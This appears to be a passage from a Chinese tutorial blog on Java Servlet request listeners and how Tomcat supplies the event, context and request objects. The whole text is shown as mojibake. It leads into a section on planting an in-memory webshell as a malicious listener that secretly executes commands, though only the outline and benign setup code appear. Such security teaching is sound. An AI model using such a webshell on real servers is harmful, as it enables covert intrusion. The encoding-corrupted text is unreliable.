    private ServletRequest request;  // é‡Œé¢è£…ç€è¯·æ±‚

    // æ„é€ æ–¹æ³•ï¼ˆTomcat è°ƒç”¨ï¼‰
    public ServletRequestEvent(ServletContext sc, ServletRequest request) {
        this.request = request;
    }

    // ä½ èƒ½è°ƒçš„æ–¹æ³•
    public ServletRequest getServletRequest() {
        return this.request;
    }

    public ServletContext getServletContext() {
        return this.servletContext;
    }
}
</code></pre><p>ä½ å†™çš„æ˜¯ï¼š</p><pre tabindex=0><code>ServletRequestEvent event
</code></pre><p>ä½ æ²¡æœ‰å†™ï¼š</p><pre tabindex=0><code>event = new ServletRequestEvent(...);  // ä½ æ²¡åˆ›å»ºï¼
</code></pre><p>ä½†ä½ <strong>èƒ½ç”¨ event.</strong>ï¼Œæ˜¯å› ä¸ºï¼š</p><blockquote><p><strong>Tomcat åœ¨è°ƒç”¨ä½ æ–¹æ³•å‰ï¼Œå·å·å¸®ä½  new å¥½äº†ï¼</strong>ï¼Œ<strong>event æ˜¯ Tomcat è‡ªåŠ¨ä¼ ç»™ä½ çš„</strong>ï¼Œä½ ä¸éœ€è¦è‡ªå·±åˆ›å»ºå®ƒã€‚</p></blockquote><pre tabindex=0><code>// Tomcat èƒŒåœ°é‡Œåšçš„ï¼ˆä½ çœ‹ä¸åˆ°ï¼‰ï¼š
ServletRequestEvent event = new ServletRequestEvent(context, request);
listener.requestInitialized(event);  // ä¼ ç»™ä½ 
</code></pre><p>å°±åƒä½ å»é¥­åº—åƒé¥­ï¼ŒæœåŠ¡å‘˜ï¼ˆTomcatï¼‰çœ‹åˆ°æœ‰äººæ¥äº†ï¼ˆè¯·æ±‚åˆ°è¾¾ï¼‰ï¼Œå°±è‡ªåŠ¨å–Šä¸€å£°ï¼š</p><blockquote><p>â€œå˜¿ï¼MyRequestListenerï¼Œæœ‰æ–°å®¢äººäº†ï¼è¿™æ˜¯ä»–çš„ä¿¡æ¯ï¼ševentâ€</p></blockquote><p>ä½ åªéœ€è¦å†™å¥½ requestInitialized(event) æ–¹æ³•ï¼Œ<strong>Tomcat ä¼šåœ¨åˆé€‚çš„æ—¶å€™è°ƒç”¨å®ƒï¼Œå¹¶æŠŠ event å¡è¿›å»</strong>ã€‚</p><p><strong>åº•å±‚åˆ°åº•å‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿï¼ˆJVM çº§åˆ«ï¼‰</strong></p><pre tabindex=0><code>// ä½ å†™çš„
public void requestInitialized(ServletRequestEvent event) {
    event.getServletRequest();
}
</code></pre><p>ç¼–è¯‘åï¼ŒJVM çœ‹åˆ°ï¼š</p><blockquote><p>â€œè¿™ä¸ªæ–¹æ³•æœ‰ä¸€ä¸ªå‚æ•°ï¼Œç±»å‹æ˜¯ ServletRequestEventï¼Œåå­—å« eventâ€</p></blockquote><p>å½“ Tomcat è°ƒç”¨æ—¶ï¼š</p><pre tabindex=0><code>// Tomcat åšçš„ï¼ˆä¼ªä»£ç ï¼‰
ServletRequestEvent obj = new ServletRequestEvent(...);
listener.requestInitialized(obj);  // ä¼ è¿›å»
</code></pre><p><strong>éªŒè¯ä¸€ä¸‹ï¼ˆä½ å¯ä»¥è¯•è¯•åŠ è¿™è¡Œï¼‰</strong></p><pre tabindex=0><code>System.out.println(&#34;event å¯¹è±¡æ˜¯: &#34; + event);
</code></pre><p>è¿è¡Œåä½ ä¼šçœ‹åˆ°ç±»ä¼¼ï¼š</p><pre tabindex=0><code>event å¯¹è±¡æ˜¯: ServletRequestEvent@12345678
</code></pre><p>è¯´æ˜å®ƒç¡®å®æ˜¯ä¸€ä¸ªçœŸå®å¯¹è±¡ï¼Œç”± Tomcat æ³¨å…¥ç»™ä½ çš„ã€‚</p><p><strong>ä¹±ä¼ ä¸€ä¸ªè¯•è¯•</strong></p><p>å‡è®¾ä½ å†™é”™ï¼š</p><pre tabindex=0><code>public void requestInitialized(String event)  // ç±»å‹é”™äº†ï¼
</code></pre><p>Tomcat è¯´ï¼š</p><blockquote><p>â€œæˆ‘ new çš„æ˜¯ ServletRequestEventï¼Œä½ å´è¦ Stringï¼Ÿ <strong>ç±»å‹ä¸åŒ¹é…ï¼ä¸èƒ½ä¼ ï¼</strong>â€</p></blockquote><p>ç¼–è¯‘éƒ½è¿‡ä¸äº†ï¼</p><p>**Tomcatï¼**æµç¨‹æ˜¯è¿™æ ·çš„ï¼š</p><pre tabindex=0><code>ç”¨æˆ·æµè§ˆå™¨ â†’ å‘é€ HTTP è¯·æ±‚ â†’ Tomcat æ”¶åˆ°
           â†“
     Tomcat å‘ç°ï¼šæœ‰ç›‘å¬å™¨ MyRequestListener
           â†“
     Tomcat åˆ›å»ºä¸€ä¸ª ServletRequestEvent å¯¹è±¡
           â†“
     Tomcat è°ƒç”¨ï¼šlistener.requestInitialized(event)
           â†“
     ä½ çš„ä»£ç æ‰§è¡Œï¼Œæ‰“å°æ—¥å¿—
</code></pre><p><strong>æœ€åï¼šæ•´ä¸ªé€»è¾‘å›¾</strong></p><pre tabindex=0><code>ç”¨æˆ·è¯·æ±‚ â†’ Tomcat æ‹¦æˆª â†’ åˆ›å»º ServletRequestEvent
                         â†“
               è‡ªåŠ¨è°ƒç”¨æ‰€æœ‰æ³¨å†Œçš„ ServletRequestListener
                         â†“
            ä½ çš„ MyRequestListener.requestInitialized(event)
                         â†“
                 æ‰“å° IPã€æ–¹æ³•ã€è·¯å¾„...
</code></pre><hr><h3 id=33-æˆ‘çš„ç–‘é—®contextæ˜¯ä»€ä¹ˆ>3.3 æˆ‘çš„ç–‘é—®ï¼šcontextæ˜¯ä»€ä¹ˆ<a hidden class=anchor aria-hidden=true href=#33-æˆ‘çš„ç–‘é—®contextæ˜¯ä»€ä¹ˆ>#</a></h3><p>ä¹Ÿæ˜¯jvmä¼ è¿›å»çš„å—ï¼Œè¿™ä¸ªä¸œè¥¿å“ªé‡Œè·å¾—çš„ï¼Ÿ</p><pre tabindex=0><code>ServletRequestEvent event = new ServletRequestEvent(context, request);
</code></pre><p>context æ˜¯ä»€ä¹ˆï¼Ÿ å®ƒä¹Ÿæ˜¯ JVM ä¼ çš„å—ï¼Ÿ å®ƒä»å“ªé‡Œæ¥çš„ï¼Ÿ</p><p><strong>ä¸€å¥è¯ï¼š</strong></p><blockquote><p><strong>context æ˜¯å½“å‰ Web åº”ç”¨çš„â€œå…¨å±€å¤§è„‘â€</strong> â€”â€” ServletContext å®ƒ<strong>ä¸æ˜¯ JVM ä¼ çš„</strong>ï¼Œè€Œæ˜¯ <strong>Tomcat åœ¨å¯åŠ¨ä½ çš„ Web åº”ç”¨æ—¶å°±åˆ›å»ºå¥½</strong>ï¼Œ ç„¶ååœ¨å¤„ç†æ¯ä¸ªè¯·æ±‚æ—¶ï¼Œ<strong>è‡ªåŠ¨å¡è¿› ServletRequestEvent çš„æ„é€ æ–¹æ³•é‡Œ</strong>ï¼</p></blockquote><p><strong>æ¯”å–»ï¼š</strong></p><table><thead><tr><th>è§’è‰²</th><th>å¯¹åº” Java å¯¹è±¡</th></tr></thead><tbody><tr><td>å…¬å¸ï¼ˆæ•´ä¸ªç½‘ç«™ï¼‰</td><td><code>ServletContext</code>ï¼ˆç®€ç§° <code>context</code>ï¼‰</td></tr><tr><td>å‘˜å·¥ï¼ˆæ¯æ¬¡è¯·æ±‚ï¼‰</td><td><code>ServletRequest</code>ï¼ˆ<code>request</code>ï¼‰</td></tr><tr><td>é€šçŸ¥å•ï¼ˆäº‹ä»¶ï¼‰</td><td><code>ServletRequestEvent</code></td></tr></tbody></table><p><strong>å…¬å¸æ˜¯æ€ä¹ˆåˆ›å»ºçš„ï¼Ÿ</strong></p><p>å½“ä½ æŠŠ WAR åŒ…éƒ¨ç½²åˆ° Tomcatï¼š</p><pre tabindex=0><code>Tomcat å¯åŠ¨ â†’ åŠ è½½ä½ çš„ webapp â†’ åˆ›å»ºä¸€ä¸ªâ€œå…¬å¸â€å¯¹è±¡
</code></pre><p>è¿™ä¸ª context ä»£è¡¨ï¼š</p><ul><li>ä½ çš„ç½‘ç«™æ ¹è·¯å¾„</li><li>web.xml é…ç½®</li><li>å…¨å±€å‚æ•°ï¼ˆ<context-param>ï¼‰</li><li>æ‰€æœ‰ Servletã€Listener å…±äº«çš„æ•°æ®</li></ul><p><strong>æ¯æ¬¡æœ‰äººè®¿é—®ï¼ˆå‘è¯·æ±‚ï¼‰ä¼šæ€æ ·ï¼Ÿ</strong></p><ol><li>ç”¨æˆ·å‘è¯·æ±‚ â†’ Tomcat æ”¶åˆ°</li><li>Tomcat åˆ›å»º ServletRequest request</li><li>Tomcat æ‹¿å‡º<strong>æ—©å°±åˆ›å»ºå¥½çš„ context</strong></li><li>æ‰“åŒ…æˆäº‹ä»¶ï¼š</li></ol><pre tabindex=0><code>ServletRequestEvent event = new ServletRequestEvent(context, request);
</code></pre><ol><li>é€šçŸ¥æ‰€æœ‰ç›‘å¬å™¨ï¼š</li></ol><pre tabindex=0><code>listener.requestInitialized(event);
</code></pre><pre tabindex=0><code>```mermaid
graph TD
    A[Tomcat å¯åŠ¨] --&gt; B[åˆ›å»º ServletContext context]
    B --&gt; C[éƒ¨ç½² Web åº”ç”¨]
    
    D[ç”¨æˆ·ç¬¬1æ¬¡è¯·æ±‚] --&gt; E[åˆ›å»º request1]
    E --&gt; F[ç”¨ context + request1 â†’ new ServletRequestEvent]
    F --&gt; G[è°ƒç”¨ä½ çš„ listener]
    
    H[ç”¨æˆ·ç¬¬2æ¬¡è¯·æ±‚] --&gt; I[åˆ›å»º request2]
    I --&gt; J[è¿˜æ˜¯ç”¨åŒä¸€ä¸ª context + request2 â†’ new ServletRequestEvent]
    J --&gt; K[å†æ¬¡è°ƒç”¨ä½ çš„ listener]
```
</code></pre><p>context æ˜¯å…¨å±€çš„ï¼Œæ°¸è¿œæ˜¯åŒä¸€ä¸ªï¼ request æ˜¯æ¯æ¬¡è¯·æ±‚ä¸€ä¸ªæ–°çš„ï¼</p><p><strong>éªŒè¯å®éªŒï¼ˆä½ å¯ä»¥åœ¨ç›‘å¬å™¨é‡Œè¯•è¯•ï¼‰</strong></p><pre tabindex=0><code>@Override
public void requestInitialized(ServletRequestEvent event) {
    ServletContext ctx = event.getServletContext();
    System.out.println(&#34;=== å…¨å±€ä¿¡æ¯ ===&#34;);
    System.out.println(&#34;ç½‘ç«™å: &#34; + ctx.getContextPath());
    System.out.println(&#34;Servlet ç‰ˆæœ¬: &#34; + ctx.getMajorVersion() + &#34;.&#34; + ctx.getMinorVersion());
    System.out.println(&#34;æœåŠ¡å™¨ä¿¡æ¯: &#34; + ctx.getServerInfo());
</code></pre><p>è¾“å‡ºç¤ºä¾‹ï¼š</p><pre tabindex=0><code>=== å…¨å±€ä¿¡æ¯ ===
ç½‘ç«™å: /myapp
Servlet ç‰ˆæœ¬: 4.0
æœåŠ¡å™¨ä¿¡æ¯: Apache Tomcat/10.1.28
</code></pre><p>æ€»ç»“ï¼š</p><table><thead><tr><th>é—®é¢˜</th><th>ç­”æ¡ˆ</th></tr></thead><tbody><tr><td><code>context</code> æ˜¯ä»€ä¹ˆï¼Ÿ</td><td>å½“å‰ <strong>Web åº”ç”¨çš„å…¨å±€ä¸Šä¸‹æ–‡</strong>ï¼Œä»£è¡¨æ•´ä¸ªç½‘ç«™</td></tr><tr><td>æ˜¯ JVM ä¼ çš„å—ï¼Ÿ</td><td><strong>ä¸æ˜¯</strong>ï¼Œæ˜¯ <strong>Tomcat åœ¨éƒ¨ç½²åº”ç”¨æ—¶åˆ›å»º</strong></td></tr><tr><td>å®ƒä»å“ªé‡Œè·å¾—ï¼Ÿ</td><td>Tomcat å¯åŠ¨æ—¶ï¼Œæ ¹æ® <code>web.xml</code> å’Œ WAR åŒ…åˆ›å»º</td></tr><tr><td>æ¯ä¸ªè¯·æ±‚éƒ½ä¸€æ ·å—ï¼Ÿ</td><td><strong>æ˜¯çš„ï¼æ‰€æœ‰è¯·æ±‚å…±äº«åŒä¸€ä¸ª <code>context</code></strong></td></tr><tr><td>æˆ‘èƒ½ç”¨å®ƒå¹²å˜›ï¼Ÿ</td><td>è¯»å…¨å±€é…ç½®ã€å­˜å…±äº«æ•°æ®ã€è·å–çœŸå®è·¯å¾„ç­‰</td></tr></tbody></table><h4 id=contextå±‚çº§ä½œç”¨åŸŸ>contextå±‚çº§ (ä½œç”¨åŸŸ)<a hidden class=anchor aria-hidden=true href=#contextå±‚çº§ä½œç”¨åŸŸ>#</a></h4><p>contextæ˜¯æœ€é¡¶çº§çš„å—ï¼Ÿä»€ä¹ˆéƒ½æœ‰å—ï¼Ÿ</p><table><thead><tr><th>é—®é¢˜</th><th>ç­”æ¡ˆ</th></tr></thead><tbody><tr><td><strong><code>context</code> æ˜¯æœ€é¡¶çº§çš„å—ï¼Ÿ</strong></td><td><strong>ä¸æ˜¯ï¼å®ƒåªæ˜¯â€œWeb åº”ç”¨çº§åˆ«â€çš„é¡¶çº§</strong></td></tr><tr><td><strong><code>context</code> ä»€ä¹ˆéƒ½æœ‰å—ï¼Ÿ</strong></td><td><strong>ä¸æ˜¯ï¼å®ƒåªç®¡â€œå…¨å±€â€çš„äº‹ï¼Œä¸åŒ…å«æ¯æ¬¡è¯·æ±‚çš„æ•°æ®</strong></td></tr></tbody></table><p>Servlet ä¸‰å¤§ä½œç”¨åŸŸï¼ˆå±‚çº§ç»“æ„ï¼‰â€”â€” è¶…çº§æ¸…æ™°å›¾è§£</p><pre tabindex=0><code>```mermaid
graph TD
    A[Tomcat æœåŠ¡å™¨] --&gt; B[å¤šä¸ª Web åº”ç”¨]
    B --&gt; C[Web åº”ç”¨ 1 - ServletContext]
    B --&gt; D[Web åº”ç”¨ 2 - ServletContext]
    
    C --&gt; E[å¤šä¸ªç”¨æˆ·ä¼šè¯ - HttpSession]
    C --&gt; F[å¤šä¸ªè¯·æ±‚ - ServletRequest]
    
    E --&gt; G[Session çº§åˆ«æ•°æ®]
    F --&gt; H[Request çº§åˆ«æ•°æ®]
```
</code></pre><p>ä¸‰å¤§ä½œç”¨åŸŸå¯¹æ¯”è¡¨ï¼ˆè®°ä½è¿™ä¸ªå°±å¤Ÿäº†ï¼ï¼‰</p><table><thead><tr><th>å±‚çº§</th><th>å¯¹è±¡</th><th>ç”Ÿå‘½å‘¨æœŸ</th><th>èƒ½å­˜ä»€ä¹ˆ</th><th>å…±äº«èŒƒå›´</th></tr></thead><tbody><tr><td><strong>æœ€é¡¶çº§</strong></td><td><strong>Tomcat å®¹å™¨</strong></td><td>å¯åŠ¨ â†’ å…³é—­</td><td>å¤šä¸ª Web åº”ç”¨</td><td>æ•´ä¸ªæœåŠ¡å™¨</td></tr><tr><td><strong>Web åº”ç”¨çº§</strong></td><td><strong><code>ServletContext</code></strong></td><td>éƒ¨ç½² â†’ å¸è½½</td><td>å…¨å±€é…ç½®ã€å…±äº«æ•°æ®</td><td><strong>ä¸€ä¸ª Web åº”ç”¨å†…æ‰€æœ‰ç”¨æˆ·</strong></td></tr><tr><td><strong>ä¼šè¯çº§</strong></td><td><strong><code>HttpSession</code></strong></td><td>ç”¨æˆ·ç™»å½• â†’ è¶…æ—¶/é€€å‡º</td><td>ç”¨æˆ·ä¸“å±æ•°æ®ï¼ˆå¦‚ç™»å½•ä¿¡æ¯ï¼‰</td><td><strong>ä¸€ä¸ªç”¨æˆ·çš„æ‰€æœ‰è¯·æ±‚</strong></td></tr><tr><td><strong>è¯·æ±‚çº§</strong></td><td><strong><code>ServletRequest</code></strong></td><td>è¯·æ±‚å¼€å§‹ â†’ å“åº”ç»“æŸ</td><td>å½“å‰è¯·æ±‚å‚æ•°ã€ä¸´æ—¶æ•°æ®</td><td><strong>å•æ¬¡è¯·æ±‚</strong></td></tr></tbody></table><p>ServletContextï¼ˆå°±æ˜¯ contextï¼‰åˆ°åº•ç®¡ä»€ä¹ˆï¼Ÿ</p><table><thead><tr><th>å¯ä»¥åš</th><th>ä¸å¯ä»¥åš</th></tr></thead><tbody><tr><td>è¯» <code>web.xml</code> é‡Œçš„ <code>&lt;context-param></code></td><td>å­˜å½“å‰ç”¨æˆ·çš„ç™»å½•å</td></tr><tr><td>å­˜æ‰€æœ‰ç”¨æˆ·å…±äº«çš„æ•°æ®ï¼ˆå¦‚åœ¨çº¿äººæ•°ï¼‰</td><td>å­˜å½“å‰è¯·æ±‚çš„è¡¨å•æ•°æ®</td></tr><tr><td>è·å–é¡¹ç›®çœŸå®è·¯å¾„ï¼ˆå¦‚ <code>/var/www/upload</code>ï¼‰</td><td>è·å–å½“å‰è¯·æ±‚çš„ IPï¼ˆè¦ç”¨ <code>request</code>ï¼‰</td></tr><tr><td>è½¬å‘è¯·æ±‚åˆ°å…¶ä»– Servlet</td><td>çŸ¥é“ç”¨æˆ·æ˜¯å¦ç™»å½•ï¼ˆè¦ç”¨ <code>session</code>ï¼‰</td></tr></tbody></table><h3 id=34-æˆ‘çš„ç–‘é—®requestæ˜¯ä»€ä¹ˆåˆ›å»ºçš„>3.4 æˆ‘çš„ç–‘é—®ï¼šrequestæ˜¯ä»€ä¹ˆåˆ›å»ºçš„<a hidden class=anchor aria-hidden=true href=#34-æˆ‘çš„ç–‘é—®requestæ˜¯ä»€ä¹ˆåˆ›å»ºçš„>#</a></h3><p><strong>ä½ çš„é—®é¢˜ï¼ˆç²¾ç‚¼ï¼‰ï¼š</strong></p><blockquote><p><strong>request æ˜¯ä»€ä¹ˆæ—¶å€™åˆ›å»ºçš„ï¼Ÿ</strong> <strong>è°åˆ›å»ºçš„ï¼Ÿ</strong> <strong>æ€ä¹ˆä¼ ç»™ ServletRequestEvent çš„ï¼Ÿ</strong></p></blockquote><p><strong>ä¸€å¥è¯ï¼š</strong></p><blockquote><p><strong>request æ˜¯ç”± *<em>Tomcat çš„ Connector æ¨¡å—*</em> åœ¨ *<em>æ¥æ”¶åˆ° TCP è¿æ¥å¹¶è§£æå®Œ HTTP åè®®å*</em> åˆ›å»ºçš„ï¼Œ ç„¶ååœ¨ *<em>è¯·æ±‚è¿›å…¥ Servlet å®¹å™¨å‰*</em> å°±åŒ…è£…å¥½ï¼Œ å†ä¼ ç»™ ServletRequestEvent æ„é€ æ–¹æ³•ï¼Œæœ€ç»ˆé€åˆ°ä½ çš„ç›‘å¬å™¨ï¼</strong></p></blockquote><pre tabindex=0><code>```mermaid
sequenceDiagram
    participant æµè§ˆå™¨
    participant Tomcat_Connector
    participant Tomcat_Container
    participant ä½ çš„Listener

    æµè§ˆå™¨-&gt;&gt;Tomcat_Connector: å‘é€ HTTP è¯·æ±‚ (TCP)
    Tomcat_Connector-&gt;&gt;Tomcat_Connector: 1. å»ºç«‹è¿æ¥ + è§£æåè®®
    Tomcat_Connector-&gt;&gt;Tomcat_Connector: 2. åˆ›å»º request å¯¹è±¡ (CoyoteRequest)
    Tomcat_Connector-&gt;&gt;Tomcat_Container: 3. ä¼ é€’ request ç»™å®¹å™¨
    Tomcat_Container-&gt;&gt;Tomcat_Container: 4. åŒ…è£…æˆ ServletRequest
    Tomcat_Container-&gt;&gt;Tomcat_Container: 5. åˆ›å»º ServletRequestEvent(context, request)
    Tomcat_Container-&gt;&gt;ä½ çš„Listener: 6. è°ƒç”¨ requestInitialized(event)
    ä½ çš„Listener-&gt;&gt;ä½ çš„Listener: 7. ä½¿ç”¨ event.getServletRequest()
```
</code></pre><p><strong>ä¸€æ­¥æ­¥æ‹†è§£ï¼ˆè°ã€åœ¨å“ªã€ä»€ä¹ˆæ—¶å€™ï¼‰</strong></p><table><thead><tr><th>æ­¥éª¤</th><th>è°å¹²çš„</th><th>ä»€ä¹ˆæ—¶å€™</th><th>åšäº†ä»€ä¹ˆ</th></tr></thead><tbody><tr><td>1</td><td><strong>Tomcat Connector</strong></td><td><strong>æµè§ˆå™¨å‘è¯·æ±‚ â†’ TCP è¿æ¥å»ºç«‹</strong></td><td>æ¥æ”¶å­—èŠ‚æµï¼Œè§£æ HTTP åè®®ï¼ˆå¤´ã€bodyï¼‰</td></tr><tr><td>2</td><td><strong>Tomcat Connector</strong></td><td><strong>è§£æå®Œ HTTP å¤´</strong></td><td>åˆ›å»º <code>org.apache.coyote.Request</code> å¯¹è±¡ï¼ˆåŸå§‹è¯·æ±‚ï¼‰</td></tr><tr><td>3</td><td><strong>Tomcat Container</strong></td><td><strong>Connector â†’ Container ç§»äº¤</strong></td><td>æŠŠ <code>coyote.Request</code> åŒ…è£…æˆ <code>ServletRequest</code></td></tr><tr><td>4</td><td><strong>Tomcat Container</strong></td><td><strong>è¿›å…¥ Servlet å®¹å™¨å‰</strong></td><td>åˆ›å»º <code>ServletRequestEvent(context, request)</code></td></tr><tr><td>5</td><td><strong>Tomcat Container</strong></td><td><strong>è°ƒç”¨ç›‘å¬å™¨æ—¶</strong></td><td>æŠŠ <code>event</code> ä¼ ç»™ä½ çš„ <code>requestInitialized(event)</code></td></tr></tbody></table><p><strong>æ¯ä¸ªç»†èŠ‚</strong></p><table><thead><tr><th>é—®é¢˜</th><th>ç­”æ¡ˆ</th></tr></thead><tbody><tr><td><code>request</code> ä»€ä¹ˆæ—¶å€™åˆ›å»ºï¼Ÿ</td><td><strong>HTTP åè®®è§£æå®Œï¼Œè¿›å…¥ Servlet å®¹å™¨å‰</strong></td></tr><tr><td>è°åˆ›å»ºçš„ï¼Ÿ</td><td><strong>Tomcat çš„ Connector â†’ Container åä½œåˆ›å»º</strong></td></tr><tr><td>è°ä¼ ç»™ <code>ServletRequestEvent</code>ï¼Ÿ</td><td><strong>Tomcat Container åœ¨è§¦å‘äº‹ä»¶æ—¶ä¼ </strong></td></tr><tr><td>æˆ‘èƒ½æ‹¿åˆ°åŸå§‹ <code>coyote.Request</code> å—ï¼Ÿ</td><td><strong>ä¸€èˆ¬ä¸èƒ½</strong>ï¼Œåªæš´éœ²æ ‡å‡† <code>ServletRequest</code></td></tr></tbody></table><h2 id=å››-springå†…å­˜é©¬ç›‘å¬å™¨>å››ã€ Springå†…å­˜é©¬(ç›‘å¬å™¨)<a hidden class=anchor aria-hidden=true href=#å››-springå†…å­˜é©¬ç›‘å¬å™¨>#</a></h2><p>âœ… ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºä¸€ä¸ªç®€å•çš„ Spring Boot Web é¡¹ç›®ï¼ˆæ¨¡æ‹ŸçœŸå®ç¯å¢ƒï¼‰</p><p>âœ… ç¬¬äºŒæ­¥ï¼šå†™ä¸€ä¸ªæ­£å¸¸çš„ HTTP è¯·æ±‚ç›‘å¬å™¨ï¼Œå¹¶è¿è¡Œçœ‹æ•ˆæœ</p><p>âœ… ç¬¬ä¸‰æ­¥ï¼šæ¨¡æ‹Ÿâ€œå†…å­˜é©¬â€æ³¨å…¥ â€”â€” åœ¨è¿è¡Œæ—¶åŠ¨æ€æ³¨å†Œä¸€ä¸ªæ¶æ„ç›‘å¬å™¨</p><p>âœ… ç¬¬å››æ­¥ï¼šéªŒè¯å®ƒæ˜¯å¦çœŸçš„èƒ½â€œå·å·æ‰§è¡Œå‘½ä»¤â€</p><hr><h3 id=41-åˆ›å»º-spring-boot-é¡¹ç›®åŸºç¡€æ¡†æ¶>4.1 åˆ›å»º Spring Boot é¡¹ç›®ï¼ˆåŸºç¡€æ¡†æ¶ï¼‰**<a hidden class=anchor aria-hidden=true href=#41-åˆ›å»º-spring-boot-é¡¹ç›®åŸºç¡€æ¡†æ¶>#</a></h3><p>ğŸ“ <strong>é¡¹ç›®ç»“æ„ï¼ˆæœ€ç»ˆé•¿è¿™æ ·ï¼‰</strong></p><pre tabindex=0><code>my-listener-demo/
â”œâ”€â”€ src/
â”‚   â”œâ”€â”€ main/
â”‚   â”‚   â”œâ”€â”€ java/com/example/demo/
â”‚   â”‚   â”‚   â”œâ”€â”€ DemoApplication.java         â† ä¸»ç¨‹åº
â”‚   â”‚   â”‚   â”œâ”€â”€ NormalListener.java          â† æ­£å¸¸ç›‘å¬å™¨
â”‚   â”‚   â”‚   â”œâ”€â”€ MaliciousListener.java       â† æ¨¡æ‹Ÿæ¶æ„ç›‘å¬å™¨ï¼ˆå†…å­˜é©¬ï¼‰
â”‚   â”‚   â”‚   â””â”€â”€ HackController.java          â† é»‘å®¢ç”¨æ¥â€œæ³¨å…¥â€çš„å…¥å£
â”‚   â”‚   â””â”€â”€ resources/
â”‚   â”‚       â””â”€â”€ application.properties
â”œâ”€â”€ pom.xml
</code></pre><p>ğŸ“„ <strong><code>pom.xml</code> â€”â€” é¡¹ç›®çš„â€œé…æ–™è¡¨â€</strong></p><pre tabindex=0><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
&lt;project xmlns=&#34;http://maven.apache.org/POM/4.0.0&#34;
         xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34;
         xsi:schemaLocation=&#34;http://maven.apache.org/POM/4.0.0 
         http://maven.apache.org/xsd/maven-4.0.0.xsd&#34;&gt;
    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
    &lt;groupId&gt;com.example&lt;/groupId&gt;
    &lt;artifactId&gt;my-listener-demo&lt;/artifactId&gt;
    &lt;version&gt;1.0.0&lt;/version&gt;
    &lt;packaging&gt;jar&lt;/packaging&gt;

    &lt;!-- ä½¿ç”¨ Spring Boot 2.7.0 --&gt;
    &lt;parent&gt;
        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;
        &lt;version&gt;2.7.0&lt;/version&gt;
        &lt;relativePath/&gt;
    &lt;/parent&gt;

    &lt;dependencies&gt;
        &lt;!-- Web æ”¯æŒï¼šTomcat + Spring MVC --&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
        &lt;/dependency&gt;
    &lt;/dependencies&gt;

    &lt;build&gt;
        &lt;plugins&gt;
            &lt;plugin&gt;
                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;
            &lt;/plugin&gt;
        &lt;/plugins&gt;
    &lt;/build&gt;
&lt;/project&gt;
</code></pre><p>ğŸ“„ <strong><code>DemoApplication.java</code> â€”â€” ä¸»ç¨‹åºå…¥å£</strong></p><pre tabindex=0><code>package com.example.demo;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

// æ ‡è®°è¿™æ˜¯ä¸€ä¸ª Spring Boot åº”ç”¨
@SpringBootApplication
public class DemoApplication {
    public static void main(String[] args) {
        // å¯åŠ¨å†…ç½® Tomcatï¼ŒåŠ è½½æ‰€æœ‰ç»„ä»¶
        SpringApplication.run(DemoApplication.class, args);
    }
}
</code></pre><p>ğŸ” <strong>é€è¡Œè§£é‡Šï¼š</strong></p><table><thead><tr><th>è¡Œ</th><th>è§£é‡Š</th></tr></thead><tbody><tr><td><code>@SpringBootApplication</code></td><td>æœ€é‡è¦çš„æ³¨è§£ï¼å‘Šè¯‰ Springï¼š â€œæˆ‘è¦å¯åŠ¨ä¸€ä¸ª Web åº”ç”¨ï¼Œè¯·è‡ªåŠ¨æ‰«ææ‰€æœ‰ç±»â€</td></tr><tr><td><code>SpringApplication.run(...)</code></td><td>å¯åŠ¨ Spring å®¹å™¨å’Œå†…åµŒ Tomcat ğŸ‘‰ æ­¤æ—¶ä¼šæ‰«æ <code>@WebListener</code> å¹¶æ³¨å†Œç›‘å¬å™¨</td></tr></tbody></table><p>ğŸ“„ <strong><code>NormalListener.java</code> â€”â€” æ­£å¸¸çš„è¯·æ±‚ç›‘å¬å™¨</strong></p><pre tabindex=0><code>package com.example.demo;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.annotation.WebListener;

// å‘Šè¯‰ Tomcatï¼šè¿™æ˜¯ä¸€ä¸ªç›‘å¬å™¨ï¼Œè¯·è‡ªåŠ¨æ³¨å†Œ
@WebListener
public class NormalListener implements ServletRequestListener {

    // å½“è¯·æ±‚å¼€å§‹æ—¶è‡ªåŠ¨è°ƒç”¨
    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        System.out.println(&#34;ğŸŸ¢ [æ­£å¸¸ç›‘å¬å™¨] è¯·æ±‚å¼€å§‹äº†ï¼æœ‰äººè®¿é—®äº†ï¼&#34;);
    }

    // å½“è¯·æ±‚ç»“æŸæ—¶è‡ªåŠ¨è°ƒç”¨
    @Override
    public void requestDestroyed(ServletRequestEvent sre) {
        System.out.println(&#34;ğŸ”´ [æ­£å¸¸ç›‘å¬å™¨] è¯·æ±‚ç»“æŸäº†ï¼&#34;);
    }
}
</code></pre><p>ğŸ” é€è¡Œè§£é‡Šï¼š</p><table><thead><tr><th>è¡Œ</th><th>è§£é‡Š</th></tr></thead><tbody><tr><td><code>@WebListener</code></td><td>Tomcat å¯åŠ¨æ—¶ä¼šå‘ç°å®ƒï¼Œå¹¶åŠ å…¥ç›‘å¬å™¨åˆ—è¡¨</td></tr><tr><td><code>implements ServletRequestListener</code></td><td>å®ç°æ¥å£ï¼Œæ‰¿è¯ºæä¾›ä¸¤ä¸ªæ–¹æ³•</td></tr><tr><td><code>requestInitialized</code></td><td>æ¯æ¬¡ HTTP è¯·æ±‚è¿›æ¥ï¼Œè‡ªåŠ¨æ‰“å°â€œè¯·æ±‚å¼€å§‹äº†â€</td></tr><tr><td><code>requestDestroyed</code></td><td>æ¯æ¬¡å“åº”å‘å›å»åï¼Œæ‰“å°â€œè¯·æ±‚ç»“æŸäº†â€</td></tr></tbody></table><p>ğŸ‘‰ è¿™ä¸ªç›‘å¬å™¨åœ¨ <strong>åº”ç”¨å¯åŠ¨æ—¶</strong> 